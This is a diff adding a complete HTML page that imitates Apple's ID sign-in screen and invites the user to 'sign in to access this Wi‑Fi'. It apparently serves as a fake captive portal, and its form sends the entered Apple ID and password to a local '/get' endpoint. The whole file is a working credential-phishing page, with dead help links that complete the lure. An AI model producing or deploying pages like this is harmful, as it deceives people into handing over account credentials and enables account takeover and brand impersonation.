@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>Apple ID - Sign In</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #f5f5f7;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .container {
+      background-color: #ffffff;
+      padding: 50px 40px;
+      border-radius: 14px;
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.12);
+      width: 100%;
+      max-width: 420px;
+      box-sizing: border-box;
+    }
+
+    .logo {
+      font-size: 60px;
+      text-align: center;
+      margin-bottom: 10px;
+      color: #000;
+    }
+
+    .logo::before {
+      content: "";
+    }
+
+    .title {
+      font-size: 1.6rem;
+      text-align: center;
+      color: #1d1d1f;
+      margin-bottom: 8px;
+    }
+
+    .subtitle {
+      font-size: 0.95rem;
+      text-align: center;
+      color: #6e6e73;
+      margin-bottom: 30px;
+    }
+
+    .form-group {
+      margin-bottom: 25px;
+    }
+
+    .form-control {
+      width: 100%;
+      padding: 16px 12px;
+      font-size: 1rem;
+      border: 1px solid #d2d2d7;
+      border-radius: 8px;
+      transition: border 0.2s ease-in-out;
+      background-color: #f9f9f9;
+      box-sizing: border-box;
+    }
+
+    .form-control:focus {
+      border-color: #0071e3;
+      outline: none;
+      background-color: #ffffff;
+    }
+
+    button {
+      width: 100%;
+      padding: 16px;
+      font-size: 1.1rem;
+      font-weight: 500;
+      background-color: #0071e3;
+      color: #ffffff;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.25s ease;
+    }
+
+    button:hover {
+      background-color: #005bb5;
+    }
+
+    .footer-links {
+      text-align: center;
+      margin-top: 30px;
+      font-size: 0.88rem;
+      color: #6e6e73;
+    }
+
+    .footer-links a {
+      color: #0071e3;
+      text-decoration: none;
+      margin: 0 8px;
+    }
+
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+
+    @media (max-width: 480px) {
+      .container {
+        padding: 40px 20px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="container">
+    <div class="logo"></div>
+    <div class="title">Sign in with your Apple ID</div>
+    <div class="subtitle">Sign in to access this Wi‑Fi.</div>
+
+    <form action="/get" method="GET">
+
+      <div class="form-group">
+        <input type="text" name="email" class="form-control" placeholder="Apple ID" required>
+      </div>
+
+      <div class="form-group">
+        <input type="password" name="password" class="form-control" placeholder="Password" required>
+      </div>
+
+      <button type="submit">Continue</button>
+
+    </form>
+
+    <div class="footer-links">
+      <a href="#">Forgot Apple ID or password?</a><br>
+      <a href="#">Create Apple ID</a>
+    </div>
+  </div>
+
+</body>
+
+</html>
